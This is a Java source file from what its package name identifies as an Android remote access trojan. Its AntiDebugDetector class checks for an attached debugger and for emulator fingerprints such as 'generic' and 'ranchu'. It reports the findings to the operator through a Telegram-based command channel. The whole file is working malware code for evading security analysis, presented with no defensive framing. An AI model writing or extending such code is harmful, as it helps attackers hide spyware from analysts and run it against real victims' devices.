package com.enterprise.rat.commands;

import android.content.Context;
import android.os.Build;
import android.os.Debug;
import com.enterprise.rat.utils.TelegramApi;

public class AntiDebugDetector {
    public void check(Context context) {
        StringBuilder sb = new StringBuilder("<b>🛡 Environment Check</b>\n\n");
        sb.append("<b>Debugger:</b> ").append(Debug.isDebuggerConnected() ? "⚠ Connected" : "✅ Clean").append("\n");
        boolean emulator = Build.FINGERPRINT.contains("generic") || Build.MODEL.contains("Emulator") || Build.HARDWARE.contains("ranchu");
        sb.append("<b>Emulator:</b> ").append(emulator ? "⚠ Yes" : "✅ No").append("\n");
        TelegramApi.sendMessage(sb.toString());
    }
}
